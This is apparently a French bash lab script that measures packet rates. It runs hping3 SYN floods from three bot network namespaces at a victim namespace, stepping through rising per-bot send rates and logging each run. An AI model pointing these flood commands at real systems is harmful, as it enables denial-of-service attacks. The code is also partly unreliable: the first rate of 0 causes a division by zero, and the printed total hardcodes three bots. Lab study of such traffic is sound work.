#!/bin/bash

# Paramètres
VICTIM_NS="victim"
VICTIM_IP="10.0.0.1"
BOT_COUNT=3
BASE_BOT_NS="bot"
TARGET_PORT=80
LOG_DIR="./logs"
TEST_DURATION=10  # Durée en secondes pour chaque test

# Couleurs
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'

# Créer un dossier pour les logs
mkdir -p "$LOG_DIR"

# Nettoyage complet (fin du script ou interruption)
cleanup() {
    echo -e "${YELLOW}[*] Nettoyage final...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 0
}
trap cleanup SIGINT SIGTERM

# Fonction pour arrêter les attaques entre les tests sans quitter le script
stop_attack() {
    echo -e "${YELLOW}[*] Arrêt de l'envoi en cours...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    PIDS=()
}

# Vérification des dépendances
for cmd in ip hping3; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] Erreur : $cmd est requis.${NC}"
        exit 1
    fi
done

# === Test : Variation contrôlée du débit d'envoi des paquets ===
echo -e "${YELLOW} Test : Variation d'intensité contrôlée du nombre de paquets envoyés pour mesure pps${NC}"
# Valeurs : nombre de paquets par seconde
RATES=(0 500 1000 1500 2000 2500 3000 3500 4000 4500 5000) # RATE = pour un seul bot, notre interface va recevoir ce nombre de paquets multiplié par le nombre de bots
for RATE in "${RATES[@]}"; do
    echo -e "${GREEN}[*] Envoi à environ $RATE pps par bot (${BOT_COUNT} bots), soit $((3 * RATE)) pps ${NC}"
    PIDS=()

    # Intervalle entre paquets en microsecondes
    # 1e6 µs = 1s, donc 1e6 / RATE donne l'intervalle pour atteindre le débit voulu
    INTERVAL_US=$((1000000 / RATE))
    TOTAL_PKTS=$((RATE * TEST_DURATION))

    for i in $(seq 1 $BOT_COUNT); do
        NS="${BASE_BOT_NS}${i}"
        ip netns exec "$NS" hping3 -S -p "$TARGET_PORT" --count "$TOTAL_PKTS" --interval "u${INTERVAL_US}" "$VICTIM_IP" > "$LOG_DIR/test_rate_${RATE}_pps_${NS}.log" 2>&1 &
        PIDS+=($!)
    done

    sleep "$TEST_DURATION"
    stop_attack
done

echo -e "${GREEN}[✓] Test pps terminé.${NC}"
